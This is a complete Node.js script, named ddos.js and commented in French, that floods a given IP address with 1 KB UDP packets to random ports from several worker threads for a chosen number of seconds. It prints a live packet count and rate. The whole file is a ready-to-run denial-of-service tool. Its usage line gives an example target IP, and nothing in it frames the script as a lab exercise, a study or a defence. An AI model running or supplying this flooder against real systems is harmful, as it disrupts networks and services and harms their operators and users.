#!/usr/bin/env node
/**
 * ddos.js — flood UDP multi-thread
 * Usage : node ddos.js <IP> [secondes] [threads]
 * Ex    : node ddos.js 82.64.1.2 30 8
 */
const dgram = require("dgram");
const { Worker, isMainThread, parentPort, workerData } = require("worker_threads");

if (isMainThread) {
  const target  = process.argv[2];
  const seconds = parseInt(process.argv[3] || "30", 10);
  const threads = parseInt(process.argv[4] || "8", 10);

  if (!target) { console.log("Usage : node ddos.js <IP> [secondes] [threads]"); process.exit(1); }

  console.log(`🔥 Cible ${target} • ${seconds}s • ${threads} threads\n`);

  let total = 0;
  const workers = [];
  for (let i = 0; i < threads; i++) {
    const w = new Worker(__filename, { workerData: { target, seconds } });
    w.on("message", (n) => { total += n; });
    workers.push(w);
  }

  const t0 = Date.now();
  const tick = setInterval(() => {
    const s = (Date.now() - t0) / 1000;
    process.stdout.write(
      `\r⏱  ${s.toFixed(1)}s  |  ${total.toLocaleString("fr-FR")} paquets  |  ~${Math.round(total / s).toLocaleString("fr-FR")} pps   `
    );
  }, 500);

  Promise.all(workers.map((w) => new Promise((r) => w.on("exit", r)))).then(() => {
    clearInterval(tick);
    console.log(`\n✅ Fini — ${total.toLocaleString("fr-FR")} paquets envoyés vers ${target}`);
    process.exit(0);
  });

} else {
  const { target, seconds } = workerData;
  const sock = dgram.createSocket("udp4");
  const payload = Buffer.alloc(1024);
  const end = Date.now() + seconds * 1000;
  let sent = 0;

  function pump() {
    if (Date.now() >= end) { parentPort.postMessage(sent); return sock.close(); }
    for (let i = 0; i < 500; i++) {
      try {
        sock.send(payload, 0, payload.length, (Math.random() * 65535) | 0, target);
        sent++;
      } catch (e) {}
    }
    setImmediate(pump);
  }
  pump();
}
